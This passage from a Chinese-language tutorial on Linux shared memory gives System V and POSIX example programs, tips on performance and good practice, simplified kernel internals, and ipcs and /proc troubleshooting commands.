<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_SIZE 1024</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_KEY 1234</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-type">int</span> shmid;
    <span class="hljs-type">char</span> *shm_addr;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sop</span>;</span>
    <span class="hljs-type">int</span> semid;
    
    <span class="hljs-comment">// 1. 创建信号量</span>
    semid = semget(SHM_KEY, <span class="hljs-number">1</span>, IPC_CREAT | <span class="hljs-number">0666</span>);
    <span class="hljs-keyword">if</span> (semid &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"semget"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 初始化信号量为 1</span>
    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">semun</span> {</span>
        <span class="hljs-type">int</span> val;
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">semid_ds</span> *<span class="hljs-title">buf</span>;</span>
        <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *<span class="hljs-built_in">array</span>;
    } arg;
    arg.val = <span class="hljs-number">1</span>;
    semctl(semid, <span class="hljs-number">0</span>, SETVAL, arg);
    
    <span class="hljs-comment">// 2. 创建共享内存</span>
    shmid = shmget(SHM_KEY, SHM_SIZE, IPC_CREAT | <span class="hljs-number">0666</span>);
    <span class="hljs-keyword">if</span> (shmid &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"shmget"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 3. 附加共享内存</span>
    shm_addr = (<span class="hljs-type">char</span> *)shmat(shmid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shm_addr == (<span class="hljs-type">char</span> *)<span class="hljs-number">-1</span>) {
        perror(<span class="hljs-string">"shmat"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 4. 写入数据</span>
    <span class="hljs-built_in">strcpy</span>(shm_addr, <span class="hljs-string">"Hello, Shared Memory!"</span>);
    
    <span class="hljs-comment">// 5. 等待其他进程读取</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Data written. Waiting for reader...\n"</span>);
    sleep(<span class="hljs-number">10</span>);
    
    <span class="hljs-comment">// 6. 分离共享内存</span>
    shmdt(shm_addr);
    
    <span class="hljs-comment">// 7. 删除共享内存</span>
    shmctl(shmid, IPC_RMID, <span class="hljs-literal">NULL</span>);
    semctl(semid, <span class="hljs-number">0</span>, IPC_RMID);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>读取共享内存的进程</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_SIZE 1024</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_KEY 1234</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-type">int</span> shmid;
    <span class="hljs-type">char</span> *shm_addr;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sop</span>;</span>
    <span class="hljs-type">int</span> semid;
    
    <span class="hljs-comment">// 1. 获取信号量</span>
    semid = semget(SHM_KEY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (semid &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"semget"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 2. 获取共享内存</span>
    shmid = shmget(SHM_KEY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shmid &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"shmget"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 3. 附加共享内存</span>
    shm_addr = (<span class="hljs-type">char</span> *)shmat(shmid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shm_addr == (<span class="hljs-type">char</span> *)<span class="hljs-number">-1</span>) {
        perror(<span class="hljs-string">"shmat"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 4. 读取数据</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Data read: %s\n"</span>, shm_addr);
    
    <span class="hljs-comment">// 5. 分离共享内存</span>
    shmdt(shm_addr);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-22">5.2 POSIX 共享内存示例</h3>
<p><strong>创建共享内存的进程</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_NAME <span class="hljs-string">"/my_shm"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_SIZE 1024</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-type">int</span> shm_fd;
    <span class="hljs-type">char</span> *shm_addr;
    
    <span class="hljs-comment">// 1. 创建共享内存对象</span>
    shm_fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, <span class="hljs-number">0666</span>);
    <span class="hljs-keyword">if</span> (shm_fd &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"shm_open"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 2. 设置共享内存大小</span>
    <span class="hljs-keyword">if</span> (ftruncate(shm_fd, SHM_SIZE) &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"ftruncate"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 3. 映射共享内存</span>
    shm_addr = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, SHM_SIZE, PROT_READ | PROT_WRITE,
                            MAP_SHARED, shm_fd, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shm_addr == MAP_FAILED) {
        perror(<span class="hljs-string">"mmap"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 4. 关闭文件描述符（不影响映射）</span>
    close(shm_fd);
    
    <span class="hljs-comment">// 5. 写入数据</span>
    <span class="hljs-built_in">strcpy</span>(shm_addr, <span class="hljs-string">"Hello, POSIX Shared Memory!"</span>);
    
    <span class="hljs-comment">// 6. 等待其他进程读取</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Data written. Waiting for reader...\n"</span>);
    sleep(<span class="hljs-number">10</span>);
    
    <span class="hljs-comment">// 7. 取消映射</span>
    munmap(shm_addr, SHM_SIZE);
    
    <span class="hljs-comment">// 8. 删除共享内存对象</span>
    shm_unlink(SHM_NAME);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>读取共享内存的进程</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_NAME <span class="hljs-string">"/my_shm"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_SIZE 1024</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-type">int</span> shm_fd;
    <span class="hljs-type">char</span> *shm_addr;
    
    <span class="hljs-comment">// 1. 打开共享内存对象</span>
    shm_fd = shm_open(SHM_NAME, O_RDONLY, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shm_fd &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"shm_open"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 2. 映射共享内存</span>
    shm_addr = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, SHM_SIZE, PROT_READ,
                            MAP_SHARED, shm_fd, <span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (shm_addr == MAP_FAILED) {
        perror(<span class="hljs-string">"mmap"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-comment">// 3. 关闭文件描述符</span>
    close(shm_fd);
    
    <span class="hljs-comment">// 4. 读取数据</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Data read: %s\n"</span>, shm_addr);
    
    <span class="hljs-comment">// 5. 取消映射</span>
    munmap(shm_addr, SHM_SIZE);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-23">6. 性能优化和最佳实践</h2>
<h3 data-id="heading-24">6.1 性能优化</h3>
<p><strong>1. 页面大小对齐</strong>：</p>
<p>共享内存段的大小应该对齐到页面大小（通常 4KB）：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span>
<span class="hljs-type">size_t</span> shm_size = (data_size + PAGE_SIZE - <span class="hljs-number">1</span>) &amp; ~(PAGE_SIZE - <span class="hljs-number">1</span>);
</code></pre>
<p><strong>2. 避免频繁映射/取消映射</strong>：</p>
<p>映射和取消映射有开销，应该保持映射直到不再需要：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 不好的做法</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-type">void</span> *addr = shmat(shmid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
    <span class="hljs-comment">// 使用共享内存</span>
    shmdt(addr);
}

<span class="hljs-comment">// 好的做法</span>
<span class="hljs-type">void</span> *addr = shmat(shmid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-comment">// 使用共享内存</span>
}
shmdt(addr);
</code></pre>
<p><strong>3. 使用大页面</strong>：</p>
<p>对于大块共享内存，可以使用大页面（Huge Pages）提高性能：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 创建大页面共享内存</span>
shmid = shmget(key, size, IPC_CREAT | SHM_HUGETLB | <span class="hljs-number">0666</span>);
</code></pre>
<h3 data-id="heading-25">6.2 最佳实践</h3>
<p><strong>1. 错误处理</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">int</span> shmid = shmget(key, size, IPC_CREAT | <span class="hljs-number">0666</span>);
<span class="hljs-keyword">if</span> (shmid &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmget"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-type">void</span> *addr = shmat(shmid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (addr == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>) {
    perror(<span class="hljs-string">"shmat"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}
</code></pre>
<p><strong>2. 清理资源</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 分离共享内存</span>
<span class="hljs-keyword">if</span> (shmdt(addr) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmdt"</span>);
}

<span class="hljs-comment">// 删除共享内存（最后一个进程）</span>
<span class="hljs-keyword">if</span> (shmctl(shmid, IPC_RMID, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmctl"</span>);
}
</code></pre>
<p><strong>3. 使用同步机制</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 使用互斥锁保护共享内存访问</span>
pthread_mutex_lock(mutex);
<span class="hljs-comment">// 访问共享内存</span>
pthread_mutex_unlock(mutex);
</code></pre>
<p><strong>4. 检查共享内存状态</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_ds</span> <span class="hljs-title">buf</span>;</span>
<span class="hljs-keyword">if</span> (shmctl(shmid, IPC_STAT, &amp;buf) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmctl"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: %lu\n"</span>, buf.shm_segsz);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Attached: %lu\n"</span>, buf.shm_nattch);
</code></pre>
<hr/>
<h2 data-id="heading-26">7. 底层实现细节</h2>
<h3 data-id="heading-27">7.1 tmpfs 文件系统</h3>
<p><strong>tmpfs 的挂载</strong>：</p>
<p>System V 共享内存使用的 tmpfs 文件系统在内核启动时挂载：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
<span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vfsmount</span> *<span class="hljs-title">shm_mnt</span>;</span>

<span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">init_tmpfs</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-comment">// 注册 tmpfs 文件系统</span>
    register_filesystem(&amp;tmpfs_fs_type);
    
    <span class="hljs-comment">// 挂载 tmpfs</span>
    shm_mnt = kern_mount(&amp;tmpfs_fs_type);
    <span class="hljs-keyword">if</span> (IS_ERR(shm_mnt)) {
        pr_err(<span class="hljs-string">"Could not kern_mount tmpfs\n"</span>);
        <span class="hljs-keyword">return</span> PTR_ERR(shm_mnt);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>tmpfs 的特点</strong>：</p>
<ol>
<li><strong>内存存储</strong>：所有数据存储在 RAM 中</li>
<li><strong>可交换</strong>：如果内存不足，可以交换到交换分区</li>
<li><strong>动态大小</strong>：可以根据需要动态增长</li>
<li><strong>临时性</strong>：系统重启后数据丢失</li>
</ol>
<h3 data-id="heading-28">7.2 页面分配机制</h3>
<p><strong>延迟分配（Lazy Allocation）</strong>：</p>
<p>共享内存段创建时，并不立即分配所有页面，而是采用延迟分配策略：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shmem_getpage_gfp</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-type">pgoff_t</span> index,
                              <span class="hljs-keyword">struct</span> page **pagep, <span class="hljs-keyword">enum</span> sgp_type sgp,
                              <span class="hljs-type">gfp_t</span> gfp, <span class="hljs-keyword">struct</span> vm_area_struct *vma,
                              <span class="hljs-keyword">struct</span> vm_fault *vmf, <span class="hljs-type">vm_fault_t</span> *fault_type)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span> =</span> inode-&gt;i_mapping;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmem_inode_info</span> *<span class="hljs-title">info</span> =</span> SHMEM_I(inode);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span>
    <span class="hljs-type">swp_entry_t</span> swap;
    <span class="hljs-type">int</span> error;
    
    <span class="hljs-comment">// 1. 查找页面是否已存在</span>
    page = find_get_entry(mapping, index);
    <span class="hljs-keyword">if</span> (page &amp;&amp; !xa_is_value(page)) {
        <span class="hljs-comment">// 页面已存在</span>
        *pagep = page;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-comment">// 2. 检查是否在交换分区</span>
    swap = shmem_get_swap(info, index);
    <span class="hljs-keyword">if</span> (swap.val) {
        <span class="hljs-comment">// 从交换分区换入</span>
        error = shmem_swapin_page(inode, index, &amp;page, sgp, gfp, vma, fault_type);
        <span class="hljs-keyword">if</span> (error)
            <span class="hljs-keyword">return</span> error;
        *pagep = page;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-comment">// 3. 分配新页面</span>
    page = shmem_alloc_and_acct_page(gfp, info, sgp, index);
    <span class="hljs-keyword">if</span> (IS_ERR(page))
        <span class="hljs-keyword">return</span> PTR_ERR(page);
    
    <span class="hljs-comment">// 4. 添加到地址空间</span>
    error = shmem_add_to_page_cache(page, mapping, index, gfp, <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (error) {
        __free_page(page);
        <span class="hljs-keyword">return</span> error;
    }
    
    *pagep = page;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>延迟分配</strong>：页面在首次访问时才分配</li>
<li><strong>交换支持</strong>：如果页面在交换分区，需要换入</li>
<li><strong>缓存管理</strong>：使用地址空间（address_space）管理页面</li>
</ol>
<h3 data-id="heading-29">7.3 页面错误处理</h3>
<p><strong>页面错误的触发</strong>：</p>
<p>当进程访问共享内存时，如果页面不在内存中，会触发页面错误：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/memory.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span>
{
    <span class="hljs-type">pte_t</span> entry;
    
    <span class="hljs-keyword">if</span> (!vmf-&gt;pte) {
        <span class="hljs-comment">// 页表项不存在，需要分配</span>
        <span class="hljs-keyword">return</span> do_fault(vmf);
    }
    
    entry = ptep_get(vmf-&gt;pte);
    <span class="hljs-keyword">if</span> (!pte_present(entry)) {
        <span class="hljs-comment">// 页面不在内存中</span>
        <span class="hljs-keyword">if</span> (pte_none(entry))
            <span class="hljs-keyword">return</span> do_fault(vmf);
        <span class="hljs-keyword">if</span> (pte_swp_swap_required(entry))
            <span class="hljs-keyword">return</span> do_swap_page(vmf);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>shmem_fault() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/shmem.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">shmem_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> vmf-&gt;vma;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(vma-&gt;vm_file);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span>
    <span class="hljs-type">vm_fault_t</span> ret = VM_FAULT_LOCKED;
    <span class="hljs-type">int</span> error;
    
    <span class="hljs-comment">// 1. 获取页面</span>
    error = shmem_getpage_gfp(inode, vmf-&gt;pgoff, &amp;page,
                              SGP_CACHE, vmf-&gt;gfp_mask, vma, vmf, <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (error)
        <span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;
    
    <span class="hljs-comment">// 2. 如果页面在交换分区，需要换入</span>
    <span class="hljs-keyword">if</span> (PageSwapCache(page)) {
        swap_readpage(page, <span class="hljs-literal">true</span>);
        wait_on_page_locked(page);
        <span class="hljs-keyword">if</span> (!PageUptodate(page)) {
            unlock_page(page);
            put_page(page);
            <span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;
        }
    }
    
    <span class="hljs-comment">// 3. 设置页表项</span>
    vmf-&gt;page = page;
    <span class="hljs-keyword">return</span> ret;
}
</code></pre>
<p><strong>关键步骤</strong>：</p>
<ol>
<li><strong>查找页面</strong>：在地址空间中查找页面</li>
<li><strong>交换处理</strong>：如果页面在交换分区，需要换入</li>
<li><strong>分配页面</strong>：如果页面不存在，分配新页面</li>
<li><strong>设置页表</strong>：将页面映射到进程地址空间</li>
</ol>
<h3 data-id="heading-30">7.4 写时复制（Copy-on-Write）</h3>
<p><strong>MAP_PRIVATE vs MAP_SHARED</strong>：</p>
<ul>
<li><strong>MAP_SHARED</strong>：多个进程共享同一物理页面，一个进程的修改对其他进程可见</li>
<li><strong>MAP_PRIVATE</strong>：每个进程有独立的页面副本，使用写时复制</li>
</ul>
<p><strong>写时复制机制</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/memory.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">do_wp_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> vmf-&gt;vma;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">old_page</span> =</span> vmf-&gt;page;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">new_page</span>;</span>
    
    <span class="hljs-comment">// 1. 检查是否允许写时复制</span>
    <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE))
        <span class="hljs-keyword">return</span> VM_FAULT_SIGBUS;
    
    <span class="hljs-comment">// 2. 分配新页面</span>
    new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, vmf-&gt;address);
    <span class="hljs-keyword">if</span> (!new_page)
        <span class="hljs-keyword">return</span> VM_FAULT_OOM;
    
    <span class="hljs-comment">// 3. 复制页面内容</span>
    copy_user_highpage(new_page, old_page, vmf-&gt;address, vma);
    
    <span class="hljs-comment">// 4. 设置页表项</span>
    <span class="hljs-type">pte_t</span> entry = mk_pte(new_page, vma-&gt;vm_page_prot);
    entry = maybe_mkwrite(pte_mkdirty(entry), vma);
    set_pte_at(vma-&gt;vm_mm, vmf-&gt;address, vmf-&gt;pte, entry);
    
    <span class="hljs-comment">// 5. 更新统计</span>
    update_mmu_cache(vma, vmf-&gt;address, vmf-&gt;pte);
    
    <span class="hljs-keyword">return</span> VM_FAULT_WRITE;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>共享内存使用 MAP_SHARED</strong>：所有进程共享同一物理页面</li>
<li><strong>写时复制用于 MAP_PRIVATE</strong>：私有映射使用写时复制</li>
<li><strong>性能考虑</strong>：写时复制可以减少内存使用，但首次写入时有开销</li>
</ol>
<h3 data-id="heading-31">7.5 内存锁定（Memory Locking）</h3>
<p><strong>SHM_LOCK 的作用</strong>：</p>
<p>锁定共享内存段，防止其被交换到磁盘。</p>
<p><strong>实现原理</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shmctl_lock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ipc_namespace *ns, <span class="hljs-type">int</span> shmid)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">shm_file</span>;</span>
    <span class="hljs-type">int</span> err;
    
    shp = shm_lock(ns, shmid);
    <span class="hljs-keyword">if</span> (IS_ERR(shp))
        <span class="hljs-keyword">return</span> PTR_ERR(shp);
    
    <span class="hljs-comment">// 1. 检查权限</span>
    <span class="hljs-keyword">if</span> (!ns_capable(ns-&gt;user_ns, CAP_IPC_LOCK)) {
        shm_unlock(shp);
        <span class="hljs-keyword">return</span> -EPERM;
    }
    
    <span class="hljs-comment">// 2. 锁定文件</span>
    shm_file = shp-&gt;shm_file;
    <span class="hljs-keyword">if</span> (is_file_hugepages(shm_file))
        err = mlock_hugepage(shm_file);
    <span class="hljs-keyword">else</span>
        err = shmem_lock(shm_file, <span class="hljs-number">1</span>, shp-&gt;mlock_ucounts);
    
    <span class="hljs-keyword">if</span> (!err &amp;&amp; !(shp-&gt;shm_perm.mode &amp; SHM_LOCKED)) {
        shp-&gt;shm_perm.mode |= SHM_LOCKED;
        shp-&gt;mlock_ucounts = get_ucounts(current_ucounts());
    }
    
    shm_unlock(shp);
    <span class="hljs-keyword">return</span> err;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>防止交换</strong>：锁定的内存不会被交换到磁盘</li>
<li><strong>权限要求</strong>：需要 <code>CAP_IPC_LOCK</code> 权限</li>
<li><strong>资源限制</strong>：受 <code>RLIMIT_MEMLOCK</code> 限制</li>
</ol>
<hr/>
<h2 data-id="heading-32">8. 故障排查和调试</h2>
<h3 data-id="heading-33">8.1 查看共享内存状态</h3>
<p><strong>使用 ipcs 命令</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看所有共享内存段</span>
ipcs -m

<span class="hljs-comment"># 查看详细信息</span>
ipcs -m -l

<span class="hljs-comment"># 查看特定进程的共享内存</span>
ipcs -m -p
</code></pre>
<p><strong>使用 /proc 文件系统</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看进程的共享内存映射</span>
<span class="hljs-built_in">cat</span> /proc/&lt;pid&gt;/maps | grep shm

<span class="hljs-comment"># 查看共享内存统计</span>
<span class="hljs-built_in">cat</span> /proc/sysvipc/shm
</code></pre>
<h3 data-id="heading-34">8.2 常见问题</h3>
<p><strong>1. 共享内存段已存在</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 错误处理</span>
<span class="hljs-type">int</span> shmid = shmget(key, size, IPC_CREAT | IPC_EXCL | <span class="hljs-number">0666</span>);
